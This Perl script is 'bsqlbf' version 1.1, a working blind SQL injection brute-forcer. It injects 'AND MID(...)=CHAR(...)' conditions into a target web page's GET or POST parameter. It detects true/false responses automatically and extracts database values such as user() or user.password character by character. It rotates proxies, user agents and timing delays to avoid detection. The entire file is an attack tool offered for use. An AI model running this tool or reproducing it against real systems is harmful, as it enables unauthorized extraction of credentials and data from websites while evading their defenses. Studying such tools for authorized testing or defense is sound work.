#!/usr/bin/perl
###############################################50

use LWP::UserAgent;
use Getopt::Long;
use strict;

###############################################################################
my $default_debug = 0;
my $default_length = 32;
my $default_method = "GET";
my $default_time = "0";
my $version = "1.1";
my $default_useragent = "bsqlbf $version";
my $default_dict = "dict.txt";
my $default_sql = "version()";
###############################################################################

$| = 1;

my ($args, $abc, $solution);
my ($string, $char, @dic);
my (%vars, @varsb);
my ($lastvar, $lastval);
my ($scheme, $authority, $path, $query, $fragment);
my $hits = 0; 
my $usedict = 0; 
my $amatch = 0;
my ($ua,$req);

###############################################################################
# Define GetOpt:
my ($url, $sql, $time, $rtime, $match, $uagent, $charset, $debug);
my ($proxy, $proxy_user, $proxy_pass,$rproxy, $ruagent); 
my ($dict, $start, $length, $method, $cookie,$blind);
my $help;

my $options = GetOptions (
  'help!'           => \$help, 
  'url=s'            => \$url,
  'sql=s'	         => \$sql,
  'blind=s'		   => \$blind,
  'match=s'	         => \$match,
  'charset=s'	   => \$charset,
  'start=s'	         => \$start,
  'length=s'	   => \$length,
  'dict=s'		   => \$dict,
  'method=s'	   => \$method,
  'uagent=s'	   => \$uagent,
  'ruagent=s'	   => \$ruagent,
  'cookie=s'	   => \$cookie,
  'proxy=s'          => \$proxy,
  'proxy_user=s'     => \$proxy_user,
  'proxy_pass=s'     => \$proxy_pass,
  'rproxy=s'     => \$rproxy,
  'debug!'           => \$debug, 
  'rtime=s'           => \$rtime, 
  'time=i'           => \$time );

&help unless ($url);
&help if $help eq 1;

#########################################################################
# Default Options.
$abc          = charset();
$uagent 	||= $default_useragent; 
$debug	||= $default_debug; 
$length 	||= $default_length; 
$solution 	||= $start;
$method 	||= $default_method;
$sql 		||= $default_sql;
$time 		||= $default_time;


&createlwp();
&parseurl();

if ( ! defined($blind)) {
		$lastvar = $varsb[$#varsb];
		$lastval = $vars{$lastvar};
} else {
		$lastvar = $blind;
		$lastval = $vars{$blind};
}

if (defined($cookie)) { &cookie() }

if (!$match) {
	print "\nTrying to find a match string...\n" if $debug eq 1;
	$amatch = "1";
	&auto_match();
}


&banner();
&httpintro();
&bsqlintro();
 
#########################################################################
# Define CHARSET to use. Dictionary /// (TODO: fix ugly code)

$dict ||= $default_dict;
open DICT,"$dict";  @dic=<DICT>; close DICT;

my $i;
my $nodict = 0;
for ($i=length($start)+1;$i<=$length;$i++) {
	my $furl;
	my $find = 0;
	$abc = charset();
	&bsqlintro if $debug eq 1;
    print "\r trying: $solution ";
	foreach (split/ */,$abc) {
		$find = 0; 
		$char = ord();
		$string = " AND MID($sql,$i,1)=CHAR($char)";
	    if (lc($method) eq "post") {
		   $vars{$lastvar} = $lastval . $string;
		}
	    print "\x08$_";
		$furl = $url;
		$furl =~ s/($lastvar=$lastval)/$1$string/;
		&createlwp if $rproxy || $ruagent;
		my $html=fetch("$furl");
		$hits++;
	    foreach (split(/\n/,$html)) {
 			if (/\Q$match\E/) { 
			    my $asc=chr($char);
			    $solution .= $asc;
			    $find = 1;
			 }
			last if $find eq "1";
   	 	}
		last if $find eq "1";
	}
	if ($usedict ne 0 && $find eq 0) { $nodict=1; $i--; }
	if ($find eq "0" && $usedict eq "0") { last; };
}

&result();

#########################################################################
sub httpintro {
	my ($strcookie, $strproxy, $struagent, $i);
	print "--[ http options ]"; print "-"x62; print "\n";
	printf ("%12s %-8s %11s %-20s\n","schema:",$scheme,"host:",$authority);
	if ($ruagent) { $struagent="rnd:$ruagent" } else { $struagent = $uagent }
	printf ("%12s %-8s %11s %-20s\n","method:",uc($method),"useragent:",$struagent);
	printf ("%12s %-50s\n","path:", $path);
	foreach (keys %vars) {
		$i++;
		printf ("%12s %-15s = %-40s\n","arg[$i]:",$_,$vars{$_});
	}
	if (! $cookie) { $strcookie="(null)" } else { $strcookie = $cookie; }
	printf ("%12s %-50s\n","cookies:",$strcookie);
	if (! $proxy && !$rproxy) { $strproxy="(null)" } else { $strproxy = $proxy; }
	if ($rproxy) { $strproxy = "rnd:$rproxy" }
	printf ("%12s %-50s\n","proxy_host:",$strproxy);
	if (! $proxy_user) { $strproxy="(null)" } else { $strproxy = $proxy_user; }
	printf ("%12s %-50s\n","proxy_user:",$strproxy);
}

sub bsqlintro {
	my ($strstart, $strblind, $strlen, $strmatch, $strsql);
	print "\n--[ blind sql injection options ]"; print "-"x47; print "\n";
	if (! $start) { $strstart = "(null)"; } else { $strstart = $start; }
	if (! $blind) { $strblind = "(last) $lastvar"; } else { $strblind = $blind; }
	printf ("%12s %-15s %11s %-20s\n","blind:",$strblind,"start:",$strstart);
	if ($length eq $default_length) { $strlen = "$length (default)" } else { $strlen = $length; }
	if ($sql eq $default_sql) { $strsql = "$sql (default)"; } else { $strsql = $sql; }
	printf ("%12s %-15s %11s %-20s\n","length:",$strlen,"sql:",$strsql);
	printf ("%12s %-50s\n","charset:",$abc);
	if ($amatch eq 1) { $strmatch = "auto match:" } else { $strmatch = "match:"; }
	#printf ("%12s %-60s\n","$strmatch",$match);
	print " $strmatch $match\n";
	print "-"x80; print "\n\n";
}
#########################################################################

sub createlwp {
	my $proxyc;
	&getproxy;
	&getuagent;
	LWP::Debug::level('+') if $debug gt 3;
	$ua = new LWP::UserAgent(
        cookie_jar=> { file => "$$.cookie" }); 
	$ua->agent("$uagent");
	if (defined($proxy_user) && defined($proxy_pass)) {
		my ($pscheme, $pauthority, $ppath, $pquery, $pfragment) =
		$proxy =~ m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
		$proxyc = $pscheme."://".$proxy_user.":".$proxy_pass."@".$pauthority;
	} else { $proxyc = $proxy; }
	
	$ua->proxy(['http'] => $proxyc) if $proxy;
	undef $proxy if $rproxy;
	undef $uagent if $ruagent;
}	

sub cookie {
	# Cookies check
	if ($cookie || $cookie =~ /; /) {
		foreach my $c (split /;/, $cookie) {
			my ($a,$b) = split /=/, $c;
			if ( ! $a || ! $b ) { die "Wrong cookie value. Use -h for help\n"; }
		}
	}
}

sub parseurl {
 ###############################################################################
 # Official Regexp to parse URI. Thank you somebody.
	($scheme, $authority, $path, $query, $fragment) =
		$url =~ m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
	# Parse args of URI into %vars and @varsb.
	foreach my $varval (split /&/, $query) {
		my ($var, $val) = split /=/, $varval;
		$vars{$var} = $val;
		push(@varsb, $var);
	}
}

sub charset {
	if ($hits ne 0 && $nodict eq 0) {
		my (%tmp,@b,$foo); undef %tmp; undef @b; undef $abc;
		foreach my $line (@dic) {
			chomp $line; 
	   		if ($line =~ /\Q$solution\E/ && $line !~ /^#/) {
				$foo = $line; $foo =~ s/\Q$solution\E//;
		 		foreach ((split/ */,$foo)) {
		  			if ($tmp{$_} ne "1" ) {
						$tmp{$_} = "1"; push (@b,$_);
					}
		 		}
			}
		}
   		 if ($#b >= 0) {
			foreach my $c (@b) { $abc .=$c;}
			$usedict = $abc;
			print "\nUsing a dictionary with this charset: $abc\n" if $debug eq 1;
		 } else {
			$abc = chardefault()
		 }
	} else {
			$abc = chardefault()
	}
	return $abc;
}

sub chardefault {
	my $tmp;
	$abc = $charset;
	if (lc($charset) eq "md5") {
		$abc = "abcdef0123456789\$.";
	} elsif (lc($charset) eq "num") {
		$abc = "0123456789";
	} elsif (lc($charset) eq "all" || ! $charset) {
   		$abc = "abcdefghijklmnopqrstuvwxyz0123456789\$.-_()[]{}º@=/\\|#?¿&·!<>ñÑ";
	}
	# If a dictionary has been used before, remove chars from current charset
	if ($usedict ne 0) {
		foreach (split(/ */, $usedict)) {
			$abc =~ s/$_//;
		}
	}
	$usedict = 0;
	return $abc;
}

sub auto_match {
	  $match = fmatch("$url");
}


#########################################################################
# Show options at running:
sub banner {
	print "\n // Blind SQL injection brute force.\n";
}


#########################################################################
# Get differences in HTML
sub fmatch {
 my ($ok,$rtrn);
 my ($furla, $furlb) = ($_[0], $_[0]);
 my ($html_a, $html_b);
 if (lc($method) eq "get") {
	$furla =~ s/($lastvar=$lastval)/$1 AND 1=1/;
	$furlb =~ s/($lastvar=$lastval)/$1 AND 1=0/;
 	$html_a = fetch("$furla");
	$html_b = fetch("$furlb");
 } elsif (lc($method) eq "post") {
   $vars{$lastvar} = $lastval . " AND 1=1";
   $html_a = fetch("$furla");
   $vars{$lastvar} = $lastval . " AND 1=0";
   $html_b = fetch("$furla");
   $vars{$lastvar} = $lastval;
 }
 my @h_a = split(/\n/,$html_a);
 my @h_b = split(/\n/,$html_b);
 foreach my $a (@h_a) {
	$ok = 0;
	if ($a =~ /\w/) {
   		foreach (@h_b) {
		    if ($a eq $_) {$ok = 1; }
		}
	} else { $ok = 1; }
   $rtrn = $a;
   last if $ok ne 1;
 }
 return $rtrn;
}


#########################################################################
# Fetch HTML from WWW
sub fetch {
	my $secs;
	if ($time eq 0) { $secs = 0 }
	elsif ($time eq 1) { $secs = 15 }
	elsif ($time eq 2) { $secs = 300 }
	if ($rtime =~ /\d*-\d*/ && $time eq 0) {
		my ($l,$p) = $rtime =~ m/(\d+-\d+)/;
		srand; $secs = int(rand($p-$l+1))+$l;
	} elsif ($rtime =~ /\d*-\d*/ && $time ne 0) {
		print "You can't run with -time and -rtime. See -help.\n";
		exit 1;
	}
	sleep $secs;
	
	my $res;
	if (lc($method) eq "get") {
		my $fetch = $_[0];
		if ($cookie) {
			$res = $ua->get("$fetch", Cookie => "$cookie");
		} elsif (!$cookie) {
			$res = $ua->get("$fetch");
		}
	} elsif (lc($method) eq "post") {
		my($s, $a, $p, $q, $f) =
  	    $url=~m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
		my $fetch = "$s://$a".$p;
		if ($cookie) {
	    	$res = $ua->post("$fetch",\%vars, Cookie => "$cookie");
		} elsif (!$cookie) {
		    $res = $ua->post("$fetch",\%vars);
		}
	} else {
		die "Wrong httpd method. Use -h for help\n";
	}
	my $html = $res->content();
	return $html;
}


sub getproxy {
	if ($rproxy && $proxy !~ /http/) {
		my @lproxy;
		open PROXY, $rproxy or die "Can't open file: $rproxy\n";
		while(<PROXY>) { push(@lproxy,$_) if ! /^#/ }
		close PROXY;
		srand; my $ind = rand @lproxy;
		$proxy = $lproxy[$ind];
	} elsif ($rproxy && $proxy =~ /http/)  {
		print "You can't run with -proxy and -rproxy. See -help.\n";
		exit 1;
	}
}

sub getuagent {
	if ($ruagent && $uagent !~ /bsqlbf/) {
		my @uproxy;
		open UAGENT, $ruagent or die "Can't open file: $ruagent\n";
		while(<UAGENT>) { push(@uproxy,$_) if ! /^#/ }
		close UAGENT;
		srand; my $ind = rand @uproxy;
		$uagent = $uproxy[$ind];
	} elsif ($ruagent && $uagent !~ /bsqlbf/)  {
		print "You can't run with -uagent and -ruagent. See -help.\n";
		exit 1;
	}
}

sub result {
	print "\r results:                                  \n" .
	 " $sql = $solution\n" if length($solution) gt 0 and $debug eq 0;
	print "\n results:                                  \n" .
	 " $sql = $solution\n" if length($solution) gt 0 and $debug eq 1;
	print " total hits: $hits\n";
}


sub help {
	&banner();
	print " usage: $0 <-url http://www.host.com/path/script.php?foo=bar> [options]\n";
	print "\n options:\n";
	print " -sql:\t\tvalid SQL syntax to get; connection_id(), database(),\n";
	print "\t\tsystem_user(), session_user(), current_user(), last_insert_id(),\n"; 
	print "\t\tuser() or all data available in the requested query, for\n";
	print "\t\texample: user.password. Default: version()\n";
	print " -blind:\tparameter to inject sql. Default is last value of url\n";
	print " -match:\tstring to match in valid query, Default is try to get auto\n";
	print " -charset:\tcharset to use. Default is all. Others charsets supported:\n";
	print " \tall:\tabcdefghijklmnopqrstuvwxyz0123456789\$.-_()[]{}º@=/\\|#?¿&·!<>ñÑ\n";
	print " \tnum:\t0123456789\n";
	print " \tmd5:\tabcdef0123456789\$\n";
	print " \tcustom:\tyour custom charset, for example: \"abc0123\"\n";
	print " -start:\tif you know the beginning of the string, use it.\n";
	print " -length:\tmaximum length of value. Default is $default_length.\n";
	print " -dict:\t\tuse dictionary for improve speed. Default is dict.txt\n";
	print " -time:\t\ttimer options:\n";
	print " \t0:\tdont wait. Default option.\n";
	print " \t1:\twait 15 seconds\n";
	print " \t2:\twait 5 minutes\n";
	print " -rtime:\twait random seconds, for example: \"10-20\".\n";
	print " -method:\thttp method to use; get or post. Default is $default_method.\n";
	print " -uagent:\thttp UserAgent header to use. Default is $default_useragent\n";
	print " -ruagent:\tfile with random http UserAgent header to use.\n";
	print " -cookie:\thttp cookie header to use\n";
	print " -rproxy:\tuse random http proxy from file list.\n";
	print " -proxy:\tuse proxy http. Syntax: -proxy=http://proxy:port/\n";
	print " -proxy_user:\tproxy http user\n";
	print " -proxy_pass:\tproxy http password\n";
    print "\n example:\n bash# $0 -url http://www.somehost.com/blah.php?u=5 -blind u -sql \"user()\"\n";
    exit(1);
}
